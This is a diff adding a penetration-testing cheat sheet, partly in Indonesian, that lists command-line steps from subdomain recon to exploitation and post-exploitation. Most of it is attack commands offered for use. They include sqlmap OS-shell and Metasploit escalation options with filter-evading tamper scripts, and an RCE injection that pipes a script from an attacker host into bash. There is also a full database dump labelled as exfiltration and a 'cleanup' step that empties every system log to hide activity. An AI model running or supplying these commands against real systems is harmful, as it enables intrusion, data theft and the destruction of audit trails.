@@ -1,0 +1,126 @@
+##########################################################
+# PENETRATION TESTING FRAMEWORK v3.0
+##########################################################
+
+[!] Direktori Kerja:
+~/pt-domain/
+├── 01-subs/          # Subdomains
+├── 02-scans/         # Ports & Services
+├── 03-vulns/         # Vulnerability Data
+├── 04-exploit/       # Proof-of-Concept
+├── 05-report/        # Laporan Akhir
+└── wordlists/        # Koleksi Wordlist
+
+==========================================================
+0. INSTALASI TOOLS (Debian/Ubuntu)
+==========================================================
+
+### Core Tools
+sudo apt install -y golang python3-pip jq nmap sqlite3
+sudo snap install nuclei
+
+### Custom Install
+# Subdomain Toolkit
+go install -v github.com/projectdiscovery/{subfinder,shuffledns,httpx}@latest
+
+# Vulnerability Scanners
+pip3 install sqlmap arjun
+
+# Cloud Tools
+git clone https://github.com/initstring/cloud_enum && cd cloud_enum && pip3 install -r requirements.txt
+
+==========================================================
+1. RECONNAISSANCE (LOW IMPACT)
+==========================================================
+
+### 1.1 Subdomain Discovery (Passive)
+subfinder -d domain.com -silent -all -o 01-subs/passive.txt
+curl -s "https://crt.sh/?q=%.domain.com" | jq -r '.[].name_value' | sed 's/\*\.//g' | anew 01-subs/crtsh.txt
+
+### 1.2 Cloud Assets
+python3 cloud_enum/cloud_enum.py -k domain.com -l 01-subs/cloud.log -s3 -gcp -azure
+
+### 1.3 Lightweight Port Scan
+naabu -list 01-subs/passive.txt -top-ports 50 -rate 500 -silent -o 02-scans/naabu_light.txt
+
+**Temuan Khas:**  
+- Subdomain tak terproteksi  
+- Bucket S3 publik  
+- Port HTTP/HTTPS terbuka
+
+==========================================================
+2. ACTIVE ENUMERATION (MEDIUM IMPACT)
+==========================================================
+
+### 2.1 Deep Service Scanning
+httpx -l 02-scans/naabu_light.txt -title -tech-detect -http2 -jarm -cdn -json -o 02-scans/httpx_full.json
+
+### 2.2 API Harvesting
+katana -list live_hosts.txt -jc -d 3 -f qurl -o 03-vulns/api_endpoints.txt
+
+### 2.3 Vulnerability Pre-Assessment
+nuclei -l live_hosts.txt -t ~/nuclei-templates/ -severity medium -tags exposure,misconfig -j -o 03-vulns/med_risk.json
+
+**Temuan Khas:**  
+- Versi software ekspos  
+- Konfigurasi CORS salah  
+- API tanpa rate limiting
+
+==========================================================
+3. EXPLOITATION (HIGH IMPACT)
+==========================================================
+
+### 3.1 Critical Vuln Detection
+nuclei -l live_hosts.txt -severity critical -tags rce,sqli,ssrf -j -o 03-vulns/critical.json -irt 5s -headless -sb
+
+### 3.2 SQLi Exploit Chain
+sqlmap -u 'https://target.com/search?q=1' --risk 3 --level 5 --os-shell --batch --tamper=charencode,space2comment
+
+### 3.3 RCE Weaponization
+nuclei -u http://target.com/rce_endpoint -var cmd='curl http://attacker.com/shell.sh|bash' -debug
+
+**Temuan Khas:**  
+- Remote Code Execution  
+- SQL Injection kritikal  
+- SSRF ke metadata AWS
+
+==========================================================
+4. POST-EXPLOITATION & REPORTING
+==========================================================
+
+### 4.1 Data Exfiltration
+sqlmap --dump-all --output-dir=04-exploit/db_dump --threads 10 --compress
+
+### 4.2 Advanced Reporting
+cat 03-vulns/critical.json | jq -r '[.info.name, .host, .info.severity] | @csv' > 05-report/critical.csv
+aquatone -ports large -scan-timeout 2000 -out 05-report/aquatone < 02-scans/naabu_light.txt
+
+### 4.3 Cleanup
+find /var/log/ -name "*.log" -exec truncate -s 0 {} \; # Hapus log aktivitas
+
+==========================================================
+5. POWER COMMANDS CHEATSHEET
+==========================================================
+
+TOOL         | POWER COMMAND
+-------------|-----------------------------------------------
+**Nuclei**   | `nuclei -u target.com -system-dns -stats -silent -headless -sb -severity critical`
+**FFuf**     | `ffuf -w ~/wordlists:WORDLIST -u URL/FUZZ -rate 5000 -H "X-Forwarded-For: 127.0.0.1" -recursion`
+**SQLMap**   | `sqlmap --os-pwn --msf-path=/opt/metasploit --priv-esc --tamper=apostrophemask,equaltolike`
+**Naabu**    | `naabu -host target.com -p - -scan-all-ips -nmap-cli 'nmap -sV --script=http-title'`
+**Shuffledns**| `shuffledns -d domain.com -w ~/wordlists/all.txt -r ~/resolvers.txt -massdns ~/massdns`
+
+==========================================================
+6. WORKFLOW OPTIMIZATION
+==========================================================
+
+### Pipeline Contoh:
+```mermaid
+graph TD
+    A[Subdomain] --> B[Port Scan]
+    B --> C{Port 80/443?}
+    C -->|Yes| D[Web Analysis]
+    C -->|No| E[Service Fingerprint]
+    D --> F[Vuln Scan]
+    E --> F
+    F --> G[Exploit]
